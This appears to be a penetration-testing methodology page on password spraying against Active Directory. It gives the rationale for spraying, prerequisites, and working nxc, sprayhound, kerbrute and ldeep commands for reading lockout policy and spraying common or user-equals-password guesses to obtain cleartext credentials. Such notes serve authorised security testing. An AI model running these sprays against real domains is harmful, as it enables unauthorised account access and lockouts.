# Password Spraying

Spraying inverts brute force: one password against every account, rather than every password against one account. Against a domain with a default lockout policy it is the most reliable way to convert a username list into a working credential.

## Why It Works

Lockout counters are per-account. Trying a single password across a thousand accounts costs each account one failed attempt, which stays under any realistic threshold — while the odds that at least one of those thousand users chose `Autumn2026!` are high.

## Prerequisites

* A validated username list
* The domain password policy, so you can stay under the lockout threshold
* Kerberos or SMB reachable on a DC

## Execution

**Password Spray**

* Get password policy (you need creds,but you should get the policy first to avoid locking accounts)
  * default policy
    * `nxc smb <dc_ip> -u '<user>' -p '<password>' --pass-pol` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
    * `Get-ADDefaultDomainPasswordPolicy` [\[tool\]](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy)
    * `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> domain_policy` [\[tool\]](https://github.com/franc-pentest/ldeep)
  * Fined Policy (Privileged)
    * `ldapsearch-ad.py --server <dc> -d <domain> -u <user> -p <pass> --type pass-pols` [\[tool\]](https://github.com/yaap7/ldapsearch-ad)
    * `Get-ADFineGainedPasswordPolicy -filter *` [\[tool\]](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adfinegrainedpasswordpolicy)
    * `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso # can also be runned with a low priv account but less information will be available` [\[tool\]](https://github.com/franc-pentest/ldeep)
* ⚠️ user == password
  * `nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
  * `sprayhound -U <users.txt> -d <domain> -dc <dc_ip> # add --lower to lowercase and --upper to uppercase. Add nothing to get only user=pass` [\[tool\]](https://github.com/Hackndo/sprayhound)
    * **→ Clear text Credentials**
* ⚠️ usuals passwords (SeasonYear!, Company123, ...)
  * `nxc smb <dc_ip> -u <users.txt> -p <password> --continue-on-success` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
  * `sprayhound -U <users.txt> -p <password> -d <domain> -dc <dc_ip>` [\[tool\]](https://github.com/Hackndo/sprayhound)
    * **→ Clear text Credentials**
  * `kerbrute passwordspray -d <domain> <users.txt> <password>` [\[tool\]](https://github.com/ropnop/kerbrute)

{% hint style="warning" %}
Read the lockout policy before spraying. Locking out a production domain is the fastest way to end an engagement badly, and the ⚠️ marks in the source diagram flag exactly these attempts.
{% endhint %}

## Related

* [User Enumeration](file:///9685693/enumeration/user-enumeration.md) — building the username list first
* [AS-REP Roasting](file:///9685693/credential-access/as-rep-roasting.md) — an alternative that needs no password guessing
